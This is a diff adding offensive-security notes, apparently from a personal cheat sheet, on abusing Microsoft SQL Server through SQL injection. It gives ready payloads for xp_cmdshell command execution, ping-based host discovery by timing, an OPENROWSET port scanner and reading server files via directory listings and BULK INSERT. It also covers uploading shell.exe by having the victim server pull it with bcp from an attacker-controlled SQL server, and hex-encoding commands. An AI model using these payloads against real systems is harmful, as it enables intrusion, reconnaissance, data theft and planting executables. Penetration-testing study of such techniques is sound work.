@@ -469,6 +469,91 @@ EXEC sp_configure 'xp_cmdshell', 0;
 EXEC sp_configure 'show advanced options', 0;
 RECONFIGURE;
 
+by using the xp_cmdshell, you can launch commands to the DB server. we can combine this with some other SQL server features to mount  a host enumeration utility via SQL injection. 
+
+performing a ping: EXEC master.dbo.xp_cmdshell 'ping <targetIP>'
+NOTE: this query will not show results, will be needed to use a time execution baseline to infer the ping result. to do that we have to compare between a known live host and the device we want to test. 
+
+timings baseline
+
+-> ping live host: between 5-8 seconds
+-> bogus IP: between 20-30 seconds
+
+using advanced SQL server features, we can also implement a simple port scanner 
+
+>. port scanning
+
+OPENROWSET is a SQL Server method you can use to access the tables of a remote server. It needs IP address and port to connect to.
+
+payload:
+
+SELECT * FROM OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something;Network=DBMSSOCN;Address=<IPADDRESS>,<TARGETPORT>;timeout=<connection_time_out>', 'SELECT 1') --
+
+if port is closed you will see similar to this: "SQL Server does not exist or access denied"
+if the port is open you will see: "general network error" / "Check your network documentation"
+if errors are hidden, and the port is closed, the connection will timeout according to the <connections timeout in seconds> value.
+
+.> read the file system
+
+OPTION1_:
+
+EXEC master..xp_cmdshell 'dir <target directory>
+
+will return the directory listing of <target_directory>, also, the output can be saved on a web accessible folder:
+
+EXEC master..xp_cmdshell 'dir C:\  > C:\inetpub\wwwroot\site\dir.txt' --
+
+and then just browse to dir.txt at the URL: http://site.com/dir.txt
+
+OPTION_2: 
+
+you can read a file on the server and then put its content into a table. we can then extract the table via SQLi as any other table. 
+
+payload:
+
+CREATE TABLE table_name (line varchar(8000));
+BULK INSERT table_name FROM '<target file>';
+
+NOTE: remember to drop the table after extracting it: DROP TABLE table_name;
+
+.> upload a file to the system
+
+involves two steps:
+
+S T E P 1: insert the file into a table in a MS SQL database under our control
+
+payload: 
+CREATE TABLE HelperTable (file text)
+BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
+
+STEP 2: force the target DB to retrieve it from our server:
+
+EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our_server_address> -U<our_server_username> -P<our_server_password>
+
+... the victim server will connect to our SQL server, read the .exe file from the table and recreate it remotely. 
+
+>> STORING COMMAND RESULTS INTO A TEMPORARY TABLE
+
+... technique to save the results of these stored procedures in a temporary table.
+
+FIRST STEP: create temp table
+this is created to hold the stored procedure output.
+
+payload: 
+
+create table table_name (id int not null identity (1,1), output nvarchar(4096) null); --
+
+..> the id column will help us to access different command outputs while the output column will contain the actual command results.
+
+--> CRAFTING THE ARGUMENT FOR xp_cmdshell
+
+we need to convert the command string of the command you want to run into an ASCII representation. sample: "dir C:\", to accomplish that is needed to convert all characters in HEX ASCII representation: 
+sample:
+64 is the HEX code for "d" and so on... and then it is needed to add a double zero after every character of the string...
+for example the final result will be: something similar like the following
+
+RESULT IN HEX: 0x640069007200200063003a005c00
+
 
 </center>
 </body>
